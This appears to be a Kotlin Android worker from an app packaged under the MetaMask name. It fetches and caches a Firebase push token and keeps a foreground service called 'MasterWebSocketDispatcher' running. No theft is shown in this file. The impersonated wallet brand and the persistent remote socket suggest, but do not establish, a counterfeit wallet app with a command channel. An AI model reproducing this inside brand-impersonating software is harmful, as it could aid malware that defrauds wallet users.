package com.example.MetaMask.services

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.Keep
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.FCMConfig
import com.google.android.gms.tasks.Tasks
import com.google.firebase.messaging.FirebaseMessaging
import java.util.concurrent.TimeUnit

@Keep
class FcmTokenCheckWorker(
    ctx: Context,
    params: WorkerParameters
) : Worker(ctx, params) {

    override fun doWork(): Result {
        android.util.Log.d("XDBG", "[FcmTokenCheckWorker] doWork enter runAttempt=$runAttemptCount") //xdbg
        val ctx = applicationContext

        return try {
            FCMConfig.init(ctx)
            DeviceUUIDProvider.init(ctx)
            android.util.Log.d("XDBG", "[FcmTokenCheckWorker] FCMConfig and DeviceUUID initialized, fetching token...") //xdbg

            val freshToken = try {
                Tasks.await(FirebaseMessaging.getInstance().token, 30, TimeUnit.SECONDS)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[FcmTokenCheckWorker] token fetch FAILED ${e.javaClass.simpleName}: ${e.message}") //xdbg
                null
            }

            android.util.Log.d("XDBG", "[FcmTokenCheckWorker] freshToken isNull=${freshToken.isNullOrEmpty()} token=${freshToken?.take(20)}...") //xdbg
            if (freshToken.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] empty token, returning success") //xdbg
                return Result.success()
            }

            val prefs = ctx.getSharedPreferences(FcmTokenService.PREFS_NAME, Context.MODE_PRIVATE)
            val cachedToken = prefs.getString(FcmTokenService.PREF_TOKEN, null)
            val confirmed = FcmTokenService.isTokenConfirmed(ctx)
            android.util.Log.d("XDBG", "[FcmTokenCheckWorker] cachedToken=${cachedToken?.take(20)}... confirmed=$confirmed tokenChanged=${freshToken != cachedToken}") //xdbg

            if (freshToken != cachedToken) {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] token changed, updating cache") //xdbg
                prefs.edit().putString(FcmTokenService.PREF_TOKEN, freshToken).apply()
                FcmTokenService.markTokenConfirmed(ctx, false)
            }

            if (!FcmTokenService.isTokenConfirmed(ctx)) {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] token NOT confirmed, ensuring MasterWebSocket running") //xdbg
                ensureMasterSocketRunning(ctx)
            } else {
                android.util.Log.d("XDBG", "[FcmTokenCheckWorker] token already confirmed, nothing to do") //xdbg
            }

            Result.success()
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenCheckWorker] doWork catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            Result.success()
        }
    }

    private fun ensureMasterSocketRunning(ctx: Context) {
        android.util.Log.d("XDBG", "[FcmTokenCheckWorker] ensureMasterSocketRunning wsRunning=${MasterWebSocketDispatcher.IS_SERVICE_RUNNING}") //xdbg
        try {
            val intent = Intent(ctx, MasterWebSocketDispatcher::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
            android.util.Log.d("XDBG", "[FcmTokenCheckWorker] startForegroundService sent") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[FcmTokenCheckWorker] ensureMasterSocketRunning catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
